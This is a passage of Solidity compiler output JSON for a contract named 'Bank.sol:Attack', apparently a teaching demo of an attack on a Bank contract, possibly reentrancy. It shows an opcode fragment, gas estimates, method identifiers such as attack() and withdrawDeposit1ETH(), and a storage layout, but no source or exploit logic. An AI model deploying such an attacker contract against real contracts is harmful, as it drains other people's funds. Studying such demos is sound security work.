0xDF ADDRESS 0xEF 0xAE 0x25 BALANCE GASPRICE 0xC7 0x2C 0xD3 0xC9 0xD2 0xEB SWAP10 0xBD 0x22 0xDD 0xB3 SGT 0x23 BLOCKHASH 0xE4 0x2D PUSH3 0x18B619 0xFB 0xBE DIFFICULTY 0x2A PUSH5 0x736F6C6343 STOP ADDMOD 0xD STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "463400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "152",
						"attack()": "infinite",
						"attackDeposit1ETH()": "infinite",
						"attacker2GetBalanceBank()": "infinite",
						"attacker3GetBalanceBank()": "infinite",
						"attackerGetBalanceBank()": "infinite",
						"getBalance()": "384",
						"withdrawDeposit1ETH()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"attackDeposit1ETH()": "0a3115a7",
					"attacker2GetBalanceBank()": "82094433",
					"attacker3GetBalanceBank()": "00d87ec3",
					"attackerGetBalanceBank()": "c3eeda78",
					"getBalance()": "12065fe0",
					"withdrawDeposit1ETH()": "2a26d5bd"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 140,
						"contract": "Bank.sol:Attack",
						"label": "bank",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Bank)112"
					}
				],
				"types": {
					"t_contract(Bank)112": {
						"encoding": "inplace",
						"label": "contract Bank",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}